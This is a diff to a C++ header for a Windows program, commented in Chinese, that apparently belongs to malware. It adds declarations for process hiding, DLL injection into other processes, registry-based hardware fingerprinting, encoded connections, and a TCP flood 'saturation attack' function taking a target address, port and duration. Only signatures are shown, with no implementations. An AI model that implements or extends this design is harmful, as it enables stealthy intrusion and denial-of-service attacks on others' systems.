@@ -5,14 +5,16 @@
 #include <fstream>
 #include  <direct.h>  
 #include <tchar.h>
+#include <thread>
 #include "resource.h"
 #pragma comment(lib,"URlmon")
 #pragma warning(disable :4996)
 #define MAX_SIZE 255
 
+#ifndef FLOOD_H
+#define FLOOD_H
+#endif
 using namespace std;
-
-
 
 
 typedef struct 
@@ -193,15 +195,15 @@ BOOL ReleaseDLLRes(LPCTSTR szDLLFullPath, UINT uResID, LPCTSTR szResType);//释放
 */
 char Getsystemtamppath(); 
 
-
-
 //kernel.cpp
 /*
 * @brief 隐藏进程
 * @praram 进程名
 */
-int hide_process(string process);
-
+int hide_process();
+bool inject_dll(DWORD pid, string dll_path);
+void find_and_inject();
+bool map_process_name(string process);
 
 //search_regedit_information.cpp
 /*
@@ -209,3 +211,29 @@ int hide_process(string process);
 */
 WCHAR search_regedit_CPU_information();
 char search_regedit_GPU_information();
+
+
+//URLEncoding.cpp 加密连接
+/*
+* @brief URL加密/连接加密
+* @praram input 输入数据
+* @praram length 数据长度
+*/
+char* URLEncode(char* input, int length);
+/*
+* @brief URL解码
+* @praram input  输入数据
+* @praram outputLength 输入数据的长度
+*/
+char* URLDecode(char* input, int* outputLength);
+
+
+//? Flood.cpp  TCP&UDP洪水饱和攻击
+/*
+* @brief TCP洪水饱和攻击
+* @praram destination 地址
+* @praram port 攻击端口 
+* @praram seconds 秒
+* @praram timespersecond 时间
+*/
+void TCPFlood(char* destination, unsigned short port, int seconds, int timespersecond = 1);
